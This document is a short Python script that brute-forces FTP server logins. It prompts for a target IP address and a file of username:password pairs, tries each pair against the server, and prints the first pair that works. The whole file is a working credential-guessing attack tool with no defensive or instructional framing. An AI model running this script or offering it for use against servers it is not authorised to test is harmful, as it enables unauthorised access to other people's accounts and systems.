#! /usr/bin/python

import ftplib
from termcolor import colored


def bruteLogin(hostname, passwdFile):
	try:
		pF = open(passwdFile)
		for line in pF.readlines():
			user_passw = line.split(":")
			userName = user_passw[0]
			passWord = user_passw[1].strip("\n")
			print("[..] Trying %s / %s" % (userName, passWord))
			try:
				ftp = ftplib.FTP(hostname)
				login = ftp.login(userName, passWord)
				print(colored("[+] Login Succeded With %s / %s" % (userName, passWord), "green"))
				ftp.quit()
				return (userName, passWord)
			except:
				pass
		print(colored("[-] Password not in list", "red"))
	except:
		print("[!] File Doesnt Exist")


def main():
	host = input("Enter Targets IP Address: ")
	passwdFile = input("Enter User/Password File Path: ")
	bruteLogin(host, passwdFile)


if __name__ == "__main__":
	main()
